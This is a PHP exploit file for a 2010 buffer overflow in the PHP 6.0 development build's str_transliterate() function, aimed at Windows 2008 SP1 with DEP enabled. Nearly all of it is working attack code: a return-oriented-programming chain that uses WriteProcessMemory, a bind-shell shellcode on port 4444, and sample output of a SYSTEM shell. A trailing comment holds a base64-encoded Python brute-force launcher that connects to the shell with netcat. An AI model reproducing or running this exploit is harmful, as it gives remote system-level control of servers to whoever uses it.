<?php
/*
04-06-2010 PHP 6.0 Dev str_transliterate() 0Day Buffer Overflow Exploit
Tested on Windows 2008 SP1 DEP alwayson 
Matteo Memelli aka ryujin ( AT ) offsec.com
original sploit: http://www.exploit-db.com/exploits/12051 (Author: Pr0T3cT10n)

Thx to muts and Elwood for helping ;)

Bruteforce script is attached in base64 format.

root@bt:~# ./brute_php6.py 172.16.30.249 /pwnPhp6.php win2k8
(*) Php6 str_transliterate() bof || ryujin # offsec.com
(*) Bruteforcing WPM ret address...
(+) Trying base address 0x78000000
(+) Trying base address 0x77000000
(+) Trying base address 0x76000000
(+) Trying base address 0x75000000
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.11>whoami
whoami
nt authority\system
*/

error_reporting(0);

$base_s = $_GET['pos_s'];
$base_e = $_GET['pos_e'];
$off_s  = $_GET['off_s'];
$off_e  = $_GET['off_e'];

if(ini_get_bool('unicode.semantics')) {
 $buff    = str_repeat("\u4141", 32);
 $tbp     = "\u2650\u6EE5"; // 6EE52650 ADDRESS TO BE PATCHED BY WPM 
 $ptw     = "\u2FE0\u6EE5"; // 6EE52FE0 POINTER FOR WRITTEN BYTES
 $ret     = "\u2660\u6EE5"; // 6EE52660 RET AFTER WPM
 $wpmargs = $ret."\uFFFF\uFFFF".$tbp."\uFFFF\uFFFF\uFFFF\uFFFF".$ptw; // WPM ARGS
 $garbage     = "\$wpm = \"\\u".strtoupper(sprintf("%02s", dechex($off_s))).strtoupper(sprintf("%02s", dechex($off_e))).
                "\\u".strtoupper(sprintf("%02s", dechex($base_s))).strtoupper(sprintf("%02s", dechex($base_e)))."\";";
 eval($garbage);
 $nops    = str_repeat("\u9090", 41);

 // TH || ROP -> Try Harder or Rest On Pain ;)
 // GETTING SHELLCODE ABSOLUTE ADDRESS
 $rop  = "\u40dd\u6FF2";   // MOV EAX,EBP/POP ESI/POP EBP/POP EBX/RETN             6FF240DD
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP   
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP  
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP  
 $rop .= "\u5DD4\u6EE6";   // POP ECX/RETN                                         6EE65DD4     
 $rop .= "\uFDBC\uFFFF";   // VALUE TO BE POPPED IN ECX (REL. OFFSET TO SHELLCODE) FFFFFDBC
 $rop .= "\u222B\u6EED";   // ADD EAX,ECX/POP EBX/POP EBP/RETN                     6EED222B   
 $rop .= "\u2650\u6EE5";   // JUNK POPPED IN EBP (RET TO SHELLCODE) 
 $rop .= "\u2650\u6EE5";   // JUNK POPPED IN EBP (RET TO SHELLCODE)

 // PATCHING BUFFER ADDY ARG FOR WPM
 $rop .= "\u1C13\u6EE6";   // ADD DWORD PTR DS:[EAX],EAX/RETN                      6EE61C13

 // GETTING NUM BYTES IN REGISTER 0x1A0 (LEN OF SHELLCODE)
 $rop .= "\uE94E\u6EE6";   // MOV EDX,ECX/POP EBP/RETN                             6EE6E94E   
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP
 $rop .= "\u5DD4\u6EE6";   // POP ECX/RETN                                         6EE65DD4
 $rop .= "\uFF5C\uFFFF";   // VALUE TO BE POPPED IN ECX                            FFFFFF5C
 $rop .= "\uE94C\u6EE6";   // SUB ECX,EDX/MOV EDX,ECX/POP EBP/RETN                 6EE6E94C
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP

 // PATCHING NUM BYTES TO BE COPIED ARG FOR WPM
 $rop .= "\u0C54\u6EE7";   // MOV DWORD PTR DS:[EAX+4],ECX/POP EBP/RETN            6EE70C54
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP    

 // REALIGNING ESP TO WPM AND RETURNING TO IT
 $rop .= "\u8640\u6EE6";   // ADD EAX,-30/POP EBP/RETN                             6EE68640
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP
 $rop .= "\u29F1\u6EE6";   // ADD EAX,0C/POP EBP/RETN                              6EE629F1
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP
 $rop .= "\u29F1\u6EE6";   // ADD EAX,0C/POP EBP/RETN                              6EE629F1
 $rop .= "\u4242\u4242";   // JUNK POPPED IN EBP
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u10AD\u6FC3";   // INC EAX/RETN                                         6FC310AD
 $rop .= "\u2C63\u6FC5";   // XCHG EAX,ESP/RETN                                    6FC52C63

           
  
 // unicode bind shellcode port 4444, 318 bytes
 $sh = "\u6afc\u4deb\uf9e8\uffff\u60ff\u6c8b\u2424\u458b\u8b3c\u057c\u0178\u8bef\u184f\u5f8b".
       "\u0120\u49eb\u348b\u018b\u31ee\u99c0\u84ac\u74c0\uc107\u0dca\uc201\uf4eb\u543b\u2824".
       "\ue575\u5f8b\u0124\u66eb\u0c8b\u8b4b\u1c5f\ueb01\u2c03\u898b\u246c\u611c\u31c3\u64db".
       "\u438b\u8b30\u0c40\u708b\uad1c\u408b\u5e08\u8e68\u0e4e\u50ec\ud6ff\u5366\u6866\u3233".
       "\u7768\u3273\u545f\ud0ff\ucb68\ufced\u503b\ud6ff\u895f\u66e5\ued81\u0208\u6a55\uff02".
       "\u68d0\u09d9\uadf5\uff57\u53d6\u5353\u5353\u5343\u5343\ud0ff\u6866\u5c11\u5366\ue189".
       "\u6895\u1aa4\uc770\uff57\u6ad6\u5110\uff55\u68d0\uada4\ue92e\uff57\u53d6\uff55\u68d0".
       "\u49e5\u4986\uff57\u50d6\u5454\uff55\u93d0\ue768\uc679\u5779\ud6ff\uff55\u66d0\u646a".
       "\u6866\u6d63\ue589\u506a\u2959\u89cc\u6ae7\u8944\u31e2\uf3c0\ufeaa\u2d42\u42fe\u932c".
       "\u7a8d\uab38\uabab\u7268\ub3fe\uff16\u4475\ud6ff\u575b\u5152\u5151\u016a\u5151\u5155".
       "\ud0ff\uad68\u05d9\u53ce\ud6ff\uff6a\u37ff\ud0ff\u578b\u83fc\u64c4\ud6ff\uff52\u68d0".
       "\uceef\u60e0\uff53\uffd6\ud0d0\u4142\u4344\u4142\u4344\u4142\u4344\u4142\u4344";

 $exploit = $buff.$ret.$wpm.$wpmargs.$nops.$sh.$rop;
 str_transliterate(0, $exploit, 0);
} else {
 exit("Error! 'unicode.semantics' has be on!\r\n");
}

function ini_get_bool($a) {
 $b = ini_get($a);
 switch (strtolower($b)) {
  case 'on':
  case 'yes':
  case 'true':
   return 'assert.active' !== $a;
  case 'stdout':
  case 'stderr':
   return 'display_errors' === $a;
  default:
   return (bool) (int) $b;
 }
}

/*
IyEvdXNyL2Jpbi9weXRob24KaW1wb3J0IHN5cywgcmFuZG9tLCBvcywgdGltZSwgdXJsbGliCmlt
cG9ydCBzb2NrZXQgCgp0YXJnZXRzID0geyd3aW4yazgnOiBbMHgxQywgMHhDNl0sIH0KdGltZW91
dCA9IDAuMQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQodGltZW91dCkKCnRyeToKICAgaG9zdCAg
ICAgPSBzeXMuYXJndlsxXQogICBwYXRoICAgICA9IHN5cy5hcmd2WzJdCiAgIHRhcmdldCAgID0g
c3lzLmFyZ3ZbM10KZXhjZXB0IEluZGV4RXJyb3I6CiAgIHByaW50ICJVc2FnZTogJXMgaG9zdCBw
YXRoIHRhcmdldCIgJSBzeXMuYXJndlswXQogICBwcmludCAiRXhhbXBsZTogJXMgMTcyLjE2LjMw
LjI0OSAvIHdpbjJrOCIgJSBzeXMuYXJndlswXQogICBwcmludCAiU3VwcG9ydGVkIHRhcmdldHM6
IFdpbmRvd3MgMjAwOCBTUDE6IHdpbjJrOCIKICAgc3lzLmV4aXQoKQoKaWYgdGFyZ2V0IG5vdCBp
biB0YXJnZXRzOgogICBwcmludCAiVGFyZ2V0IG5vdCBzdXBwb3J0ZWQhIgogICBzeXMuZXhpdCgp
CmVsc2U6CiAgIHRhcmdldF9hX3MsIHRhcmdldF9hX2UgPSB0YXJnZXRzW3RhcmdldF1bMF0sIHRh
cmdldHNbdGFyZ2V0XVsxXQoKZGVmIHNlbmRSZXF1ZXN0KGksayk6CiAgIHBhcmFtcyA9IHVybGxp
Yi51cmxlbmNvZGUoeydwb3NfZSc6IGksICdwb3Nfcyc6IGssICdvZmZfcyc6IHRhcmdldF9hX3Ms
IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnb2ZmX2UnOiB0YXJnZXRfYV9lLCAncm5k
Jzogc3RyKGludChyYW5kb20ucmFuZG9tKCkpKSx9KQogICB0cnk6CiAgICAgIGYgPSB1cmxsaWIu
dXJsb3BlbigiaHR0cDovLyVzJXM/JXMiICUgKGhvc3QsIHBhdGgsIHBhcmFtcykpCiAgICAgIHBy
aW50IGYucmVhZCgpCiAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICBwYXNzCgppZiBfX25hbWVfXyA9
PSAnX19tYWluX18nOgogICBwcmludCAiKCopIFBocDYgc3RyX3RyYW5zbGl0ZXJhdGUoKSBib2Yg
fHwgcnl1amluICMgb2Zmc2VjLmNvbSIKICAgcHJpbnQgIigqKSBCcnV0ZWZvcmNpbmcgV3JpdGVQ
cm9jZXNzTWVtb3J5IHJldCBhZGRyZXNzLi4uIgogICBiID0gcmFuZ2UoMTEyLDEyMSkKICAgYi5y
ZXZlcnNlKCkKICAgZm9yIGsgaW4gYjoKICAgICAgcHJpbnQgIigrKSBUcnlpbmcgYmFzZSBhZGRy
ZXNzIDB4JXgwMDAwMDAiICUgayAKICAgICAgZm9yIGkgaW4gcmFuZ2UoMSwyNTYpOgogICAgICAg
ICBzZW5kUmVxdWVzdChpLGspCiAgICAgICAgIGlmIG9zLnN5c3RlbSgibmMgLXZuICVzIDQ0NDQg
Mj4vZGV2L251bGwiICUgaG9zdCkgPT0gMDoKICAgICAgICAgICAgYnJlYWsKICAgICAgICAgdGlt
ZS5zbGVlcCgwLjA1KSAK
*/
?>